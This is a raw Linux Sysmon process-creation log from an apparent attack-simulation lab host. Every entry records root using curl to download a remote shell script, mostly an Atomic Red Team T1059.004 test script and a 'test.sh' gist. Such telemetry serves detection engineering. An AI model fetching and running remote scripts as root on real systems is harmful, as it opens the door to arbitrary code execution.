<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:50:35.113847000Z"/><EventRecordID>94477763</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:50:35.117</Data><Data Name="ProcessGuid">{ec28c72e-0fdb-62e4-782d-e0fe87550000}</Data><Data Name="ProcessId">23596</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/f3c6091d189ac6ed73b55a7c0e7f4d68/raw/e0f1faca6487bc92fa5e56615aa91335090db47a/test.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:50:30.420552000Z"/><EventRecordID>94477535</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:50:30.423</Data><Data Name="ProcessGuid">{ec28c72e-0fd6-62e4-780d-27b20c560000}</Data><Data Name="ProcessId">23592</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/f3c6091d189ac6ed73b55a7c0e7f4d68/raw/e0f1faca6487bc92fa5e56615aa91335090db47a/test.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:48:55.180444000Z"/><EventRecordID>94472493</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:48:55.183</Data><Data Name="ProcessGuid">{ec28c72e-0f77-62e4-781d-5c1a9a550000}</Data><Data Name="ProcessId">23541</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:48:43.276748000Z"/><EventRecordID>94469878</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:48:43.279</Data><Data Name="ProcessGuid">{ec28c72e-0f6b-62e4-782d-8b2f84550000}</Data><Data Name="ProcessId">23534</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:48:30.957531000Z"/><EventRecordID>94468840</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:48:30.960</Data><Data Name="ProcessGuid">{ec28c72e-0f5e-62e4-788d-a0e78f550000}</Data><Data Name="ProcessId">23529</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:48:23.522828000Z"/><EventRecordID>94468546</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:48:23.525</Data><Data Name="ProcessGuid">{ec28c72e-0f57-62e4-78ed-bcd46b550000}</Data><Data Name="ProcessId">23522</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:47:18.722110000Z"/><EventRecordID>94464232</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:47:18.725</Data><Data Name="ProcessGuid">{ec28c72e-0f16-62e4-78bd-82e05d550000}</Data><Data Name="ProcessId">23501</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh /tmp/echoartfish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:46:48.965365000Z"/><EventRecordID>94463215</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:46:48.968</Data><Data Name="ProcessGuid">{ec28c72e-0ef8-62e4-788d-a6da4e560000}</Data><Data Name="ProcessId">23485</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:46:37.975802000Z"/><EventRecordID>94460534</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:46:37.978</Data><Data Name="ProcessGuid">{ec28c72e-0eed-62e4-78ad-4b3028560000}</Data><Data Name="ProcessId">23473</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:45:18.131620000Z"/><EventRecordID>94458051</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:45:18.134</Data><Data Name="ProcessGuid">{ec28c72e-0e9e-62e4-786d-bc89ab550000}</Data><Data Name="ProcessId">23455</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:44:51.975318000Z"/><EventRecordID>94457397</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:44:51.978</Data><Data Name="ProcessGuid">{ec28c72e-0e83-62e4-780d-fa5a13560000}</Data><Data Name="ProcessId">23438</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:44:38.050090000Z"/><EventRecordID>94456539</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:44:38.053</Data><Data Name="ProcessGuid">{ec28c72e-0e76-62e4-788d-b2349b550000}</Data><Data Name="ProcessId">23434</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:43:22.494690000Z"/><EventRecordID>94455212</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:43:22.497</Data><Data Name="ProcessGuid">{ec28c72e-0e2a-62e4-78ad-3268be550000}</Data><Data Name="ProcessId">23427</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh /tmp/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:43:05.044149000Z"/><EventRecordID>94454149</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:43:05.046</Data><Data Name="ProcessGuid">{ec28c72e-0e19-62e4-782d-c19dfa550000}</Data><Data Name="ProcessId">23423</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh /tmp</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:42:58.148373000Z"/><EventRecordID>94453922</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:42:58.150</Data><Data Name="ProcessGuid">{ec28c72e-0e12-62e4-78ed-4f4774550000}</Data><Data Name="ProcessId">23419</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh /tmp</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:42:16.668604000Z"/><EventRecordID>94452919</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:42:16.671</Data><Data Name="ProcessGuid">{ec28c72e-0de8-62e4-78dd-fab9d7550000}</Data><Data Name="ProcessId">23414</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:42:07.533306000Z"/><EventRecordID>94452498</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:42:07.535</Data><Data Name="ProcessGuid">{ec28c72e-0ddf-62e4-78fd-a137b1550000}</Data><Data Name="ProcessId">23409</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:41:29.117729000Z"/><EventRecordID>94452061</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:41:29.119</Data><Data Name="ProcessGuid">{ec28c72e-0db9-62e4-782d-bf281d560000}</Data><Data Name="ProcessId">23383</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
